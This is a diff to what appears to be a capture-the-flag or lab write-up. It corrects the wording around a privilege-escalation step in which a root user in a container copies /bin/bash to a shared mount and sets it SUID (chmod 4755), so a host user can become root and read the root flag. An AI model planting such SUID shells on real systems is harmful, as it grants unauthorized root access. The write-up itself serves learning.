@@ -812,7 +812,7 @@ root@nyc-pweb03:/mnt/share# cp /bin/bash rootbash
 root@nyc-pweb03:/mnt/share# chmod 4755 rootbash 
 ```
 
-So now on the docker contained ill copy `/bin/bash` to into rootbash in the current dir, then give all users full permissions on it
+So now on the docker container ill make a SUID copy of `/bin/bash` 
 
 ```python
 spencer@ip-10-0-20-19:/var/share$ ls -al
@@ -837,7 +837,9 @@ Now i can use it to become root
 
 ![](Pasted%20image%2020261009182528.png)
 
-Then i can get the root fla
+Then i can get the root flag
+
+
 
 
 
